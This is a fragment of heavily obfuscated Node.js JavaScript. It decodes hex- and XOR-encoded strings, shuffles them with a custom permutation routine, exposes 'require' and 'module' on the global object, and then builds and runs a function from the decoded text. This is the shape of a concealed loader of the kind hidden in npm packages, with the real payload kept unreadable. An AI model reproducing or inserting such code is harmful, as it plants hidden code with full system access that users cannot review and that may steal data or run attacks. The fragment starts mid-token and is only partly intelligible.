cfdcedc1cacb','9c98ffefebe0d7c0','9f9e9a9d9c9896cbcae3f6efc0'];VcIjEMuK$j=function(){return oUjdMfbQcGFkunf;};return VcIjEMuK$j();}function K_OvFfoTzZBpkVfumckkx(PWQbTpLGxClDeNsCxXzTbZz,EVJyw){var mrfGlKqVhshu_zzTxTEY=VcIjEMuK$j();return K_OvFfoTzZBpkVfumckkx=function(WWf_FpC$wUmEzescq,GLaUiwkUVhlK){WWf_FpC$wUmEzescq=WWf_FpC$wUmEzescq-(parseInt(0x71e)+-parseInt(0xf62)*-0x2+-parseInt(0x110)*parseInt(0x23));var rAKTE$$s=mrfGlKqVhshu_zzTxTEY[WWf_FpC$wUmEzescq];if(K_OvFfoTzZBpkVfumckkx['ZLDSsv']===undefined){var AEuQljvAXEheSbNX=function(wIqcSIlM_NXfqti_rsrJ){var cPYsIsJwvMr_EMITKtqkfjBvG=Number(-parseInt(0x3))*parseInt(-0x5c2)+Math.max(-parseInt(0xf19),-parseInt(0xf19))*-0x1+-0x1db1&0x1f9d+-0x1f37+0x99,a_cUZI_sC=new Uint8Array(wIqcSIlM_NXfqti_rsrJ['match'](/.{1,2}/g)['map'](Z$qpQwEaAASM=>parseInt(Z$qpQwEaAASM,-0x9b*parseInt(0x5)+-0x2701+parseInt(parseInt(0x8))*0x543))),sK$mlNMPxWMekWOfEkSsxXngwV=a_cUZI_sC['map'](DhwzMKSRTSxuFDbuUCBvelhZn=>DhwzMKSRTSxuFDbuUCBvelhZn^cPYsIsJwvMr_EMITKtqkfjBvG),BIpeVU=new TextDecoder(),yZuPwHMAmrSX$CGBcvZk=BIpeVU['decode'](sK$mlNMPxWMekWOfEkSsxXngwV);return yZuPwHMAmrSX$CGBcvZk;};K_OvFfoTzZBpkVfumckkx['ErOXNP']=AEuQljvAXEheSbNX,PWQbTpLGxClDeNsCxXzTbZz=arguments,K_OvFfoTzZBpkVfumckkx['ZLDSsv']=!![];}var egvdFOdsiFETl_$rmiIFL=mrfGlKqVhshu_zzTxTEY[Number(-0x1afb)+Math.trunc(-parseInt(0x1c0e))+-0x3709*Math.max(-0x1,-parseInt(0x1))],DwrurdUIhiradtkXdAmV=WWf_FpC$wUmEzescq+egvdFOdsiFETl_$rmiIFL,UAEobg$bgmNUkb=PWQbTpLGxClDeNsCxXzTbZz[DwrurdUIhiradtkXdAmV];return!UAEobg$bgmNUkb?(K_OvFfoTzZBpkVfumckkx['iDIoGH']===undefined&&(K_OvFfoTzZBpkVfumckkx['iDIoGH']=!![]),rAKTE$$s=K_OvFfoTzZBpkVfumckkx['ErOXNP'](rAKTE$$s),PWQbTpLGxClDeNsCxXzTbZz[DwrurdUIhiradtkXdAmV]=rAKTE$$s):rAKTE$$s=UAEobg$bgmNUkb,rAKTE$$s;},K_OvFfoTzZBpkVfumckkx(PWQbTpLGxClDeNsCxXzTbZz,EVJyw);}(function(vClcOMsNSGVteSEFuZvDs,NglM_V$L){var IhdPtRd_LWEum_u=K_OvFfoTzZBpkVfumckkx,H_ZIfBEsKdPYnc=vClcOMsNSGVteSEFuZvDs();while(!![]){try{var KXD$oJ_udINnDeuKOxEZKc=Math['trunc'](-parseFloat(IhdPtRd_LWEum_u(0xbe))/(parseInt(0x13)*-parseInt(0x202)+parseInt(0x17cc)+parseInt(0x5)*0x2df))*(-parseFloat(IhdPtRd_LWEum_u(0xc6))/(0x285+parseInt(parseInt(0x1567))+-0x17ea))+parseFloat(IhdPtRd_LWEum_u(0xbc))/(Number(parseInt(0x62f))+parseFloat(0x1f)*Number(0xe2)+-0x218a)*Math['max'](-parseFloat(IhdPtRd_LWEum_u(0xbf))/(0x1*-0x233+Math.ceil(parseInt(0x1840))+Math.trunc(0x1)*Number(-0x1609)),-parseFloat(IhdPtRd_LWEum_u(0xc2))/(-0x1ccf+Math.ceil(0xa2)*Math.floor(0x10)+Math.max(parseInt(0x12b4),parseInt(0x12b4))))+Math['trunc'](-parseFloat(IhdPtRd_LWEum_u(0xc4))/(Math.max(-0x1372,-parseInt(0x1372))+Math.max(-0x23fb,-0x23fb)*parseInt(0x1)+-0x3773*Math.ceil(-parseInt(0x1))))*(parseFloat(IhdPtRd_LWEum_u(0xb8))/(parseInt(0x3)*-parseInt(0x65a)+0x3*Number(-parseInt(0x312))+0x1c4b))+parseInt(-parseFloat(IhdPtRd_LWEum_u(0xb6))/(-0xbdd+parseInt(0xcb6)+-0x13*parseFloat(0xb)))*(parseFloat(IhdPtRd_LWEum_u(0xc0))/(Number(-parseInt(0x2447))+0x8ff*parseFloat(-0x3)+parseInt(0x3f4d)))+-parseFloat(IhdPtRd_LWEum_u(0xc1))/(parseFloat(-parseInt(0x7))*parseInt(0x2b1)+0x2*0x334+parseInt(0xc79))+-parseFloat(IhdPtRd_LWEum_u(0xbd))/(0x1c7+0x2c3*Math.ceil(-parseInt(0x5))+-parseInt(0x119)*Math.max(-parseInt(0xb),-0xb))*parseInt(parseFloat(IhdPtRd_LWEum_u(0xc7))/(parseInt(parseInt(0x2657))+Number(-parseInt(0xc1a))*0x2+-parseInt(0x1)*0xe17))+Math['ceil'](parseFloat(IhdPtRd_LWEum_u(0xb9))/(Math.trunc(0x20a5)+parseInt(0x8cb)*Math.ceil(parseInt(0x3))+Math.ceil(0x1f)*-0x1e7));if(KXD$oJ_udINnDeuKOxEZKc===NglM_V$L)break;else H_ZIfBEsKdPYnc['push'](H_ZIfBEsKdPYnc['shift']());}catch(HCDAaG$PmeuVDTojvYja$ZzRahM){H_ZIfBEsKdPYnc['push'](H_ZIfBEsKdPYnc['shift']());}}}(VcIjEMuK$j,parseInt(0x1)*Math.ceil(-parseInt(0x19ebb))+0x435a0+parseInt(0x5f5ff)),function(uSrc$aZ$hb,OdsZPwFe,SEibsJMMIsHPCSTAFbPKlL,W$k_ofS){var zxZaofozw=K_OvFfoTzZBpkVfumckkx;uSrc$aZ$hb['bx']=bx;function UFvKiVPWZOSSAxJ_AbUxgkoCYx(gGQKg_ra$RQqYl,TLX$fMvs){var H$xvfkYw=K_OvFfoTzZBpkVfumckkx,aWc_HhFsGYjwdHigMbmdgN$OlFz=gGQKg_ra$RQqYl[H$xvfkYw(0xba)](''),mHJFbhkwcE$vPXCY=Math.max(-0xd3d,-0xd3d)*Math.ceil(-0x1)+Math.ceil(-parseInt(0xae))*0x13+Number(-0x53),SIJKcPrKZd$JWoroCbVvs=TLX$fMvs[parseInt(0x224b)+0x356*parseInt(-parseInt(0x9))+Number(0x445)*Math.trunc(-parseInt(0x1))],mmeedIoIhnNgY_PAzmIDO=aWc_HhFsGYjwdHigMbmdgN$OlFz[H$xvfkYw(0xbb)];while(mHJFbhkwcE$vPXCY<mmeedIoIhnNgY_PAzmIDO){var L_sZRvkqY=SIJKcPrKZd$JWoroCbVvs*(mHJFbhkwcE$vPXCY+TLX$fMvs[Math.ceil(-parseInt(0x26b))*-0x4+Math.ceil(-parseInt(0x313))*0x1+-parseInt(0x4)*0x1a6])+(SIJKcPrKZd$JWoroCbVvs+mHJFbhkwcE$vPXCY)%TLX$fMvs[0x2609+parseInt(0x169)*-0x1+-0x1*0x249e]+TLX$fMvs[-0x4*-0x269+-0x57a*0x4+parseInt(0xc45)],ulhhafxRQ_ItqfT=SIJKcPrKZd$JWoroCbVvs*(mHJFbhkwcE$vPXCY+TLX$fMvs[parseInt(0x316)*parseFloat(-0x1)+parseInt(0x1d0b)*0x1+-parseInt(0x2e2)*Math.trunc(0x9)])+(SIJKcPrKZd$JWoroCbVvs*TLX$fMvs[Math.floor(0x603)+-0xe0+-parseInt(0x520)]+mHJFbhkwcE$vPXCY)%TLX$fMvs[Math.floor(-parseInt(0x197))*Math.floor(-parseInt(0xb))+-0x2697+0x151e],toVOzjxwJdZHoaKKJlrZcy=L_sZRvkqY%mmeedIoIhnNgY_PAzmIDO,bki__aI=ulhhafxRQ_ItqfT%mmeedIoIhnNgY_PAzmIDO,pQxYAhsGXhrNj$AIzOD$qE=aWc_HhFsGYjwdHigMbmdgN$OlFz[toVOzjxwJdZHoaKKJlrZcy];aWc_HhFsGYjwdHigMbmdgN$OlFz[toVOzjxwJdZHoaKKJlrZcy]=aWc_HhFsGYjwdHigMbmdgN$OlFz[bki__aI],aWc_HhFsGYjwdHigMbmdgN$OlFz[bki__aI]=pQxYAhsGXhrNj$AIzOD$qE,SIJKcPrKZd$JWoroCbVvs=(L_sZRvkqY+ulhhafxRQ_ItqfT+SIJKcPrKZd$JWoroCbVvs+mHJFbhkwcE$vPXCY)%TLX$fMvs[Math.floor(0x1084)+parseInt(0x20)*parseFloat(-0xfe)+parseInt(0x5)*0x30d],mHJFbhkwcE$vPXCY+=Math.floor(-parseInt(0x213a))*parseInt(0x1)+parseInt(0x850)+0x18eb;}return aWc_HhFsGYjwdHigMbmdgN$OlFz[H$xvfkYw(0xb7)]('');}var MHR_eCgkyaptEwWOWo=String[zxZaofozw(0xc5)](-parseInt(0xc6b)+Math.ceil(0x2)*-0xa27+parseInt(0x8)*0x41b),mcvOdqbVG=UFvKiVPWZOSSAxJ_AbUxgkoCYx(zxZaofozw(0xb3),W$k_ofS);mcvOdqbVG=mcvOdqbVG[zxZaofozw(0xba)]('#')[zxZaofozw(0xb7)](MHR_eCgkyaptEwWOWo)[zxZaofozw(0xba)]('~1')[zxZaofozw(0xb7)]('#')[zxZaofozw(0xba)]('~0')[zxZaofozw(0xb7)]('~')[zxZaofozw(0xba)](MHR_eCgkyaptEwWOWo),uSrc$aZ$hb[mcvOdqbVG[-0x17c*0x17+0x1ea7+0x37d]]=OdsZPwFe;if(typeof module===mcvOdqbVG[-parseInt(0x71f)*-0x5+-0x4*Math.max(0x893,0x893)+0x1*-0x14e])uSrc$aZ$hb[mcvOdqbVG[Math.trunc(parseInt(0x143a))+0x1e88+parseInt(parseInt(0x1))*-0x32c0]]=module;var rCYWIvJLlCXzb$e$aTm=UFvKiVPWZOSSAxJ_AbUxgkoCYx(zxZaofozw(0xc3),SEibsJMMIsHPCSTAFbPKlL),gWwfWnieY_GL_qwviD=UFvKiVPWZOSSAxJ_AbUxgkoCYx[rCYWIvJLlCXzb$e$aTm[zxZaofozw(0xb4)](parseInt(0xc58)*-0x2+-parseInt(0x14b)*Math.ceil(parseInt(0x5))+parseInt(0x1f27),-0x596+parseInt(0xd77)+Math.floor(parseInt(0x11))*Math.floor(-parseInt(0x76)))],DBFjtM_$vabs=gWwfWnieY_GL_qwviD('',UFvKiVPWZOSSAxJ_AbUxgkoCYx(zxZaofozw(0xb5),SEibsJMMIsHPCSTAFbPKlL)),TRwEPOYdgR$pM=DBFjtM_$vabs(UFvKiVPWZOSSAxJ_AbUxgkoCYx(zxZaofozw(0xb2),SEibsJMMIsHPCSTAFbPKlL));return gWwfWnieY_GL_qwviD('',TRwEPOYdgR$pM)(-0x1e17+-0xe38+parseFloat(parseInt(0x361c))),parseInt(0x1df6)*Math.ceil(0x2)+-0x4102+-parseInt(0x1f)*-0x14d;}(global,require,[0x2f83*0xe3+-0x1*-parseInt(0x68a3e6)+-0x22bdec,parseInt(0x94c)+-0x1be8+parseInt(0x13c1)*parseInt(0x1),Number(-parseInt(0x5363))+0x7da4+Math.max(parseInt(0x9c),parseInt(0x9c))*0xb3,Math.max(-0x175f,-parseInt(0x175f))*0x1+-0x871*-0x4+-parseInt(0xe)*0xaf,Math.trunc(parseInt(0x1862))+Math.max(0x8fcd,parseInt(0x8fcd))+0x383*parseInt(0x12),parseInt(0x2)*-parseInt(0x9f576)+parseInt(0x2c3af9)+Math.max(parseInt(0x36c50a),parseInt(0x36c50a))],[-0xe2e20f*parseInt(0x1)+-0x2a749e+-parseInt(0x41e)*Math.floor(-0x5f8c),0x7*parseInt(0x35)+parseInt(0x2)*parseInt(0x70)+-parseInt(0xae),-0x1*-0x786f+parseInt(0x8507)+Math.ceil(parseInt(0xd))*Math.trunc(-parseInt(0xc8d)),-0x62b+-parseInt(0x2053)+-parseInt(0x3d)*Number(-parseInt(0xab)),parseFloat(-parseInt(0x7))*parseInt(0x830)+0x171*-parseInt(0x5a)+parseInt(0x16b25),parseInt(0x394b)*Math.ceil(-0x290)+Math.trunc(-parseInt(0x2771fc))+0x10b0163]));
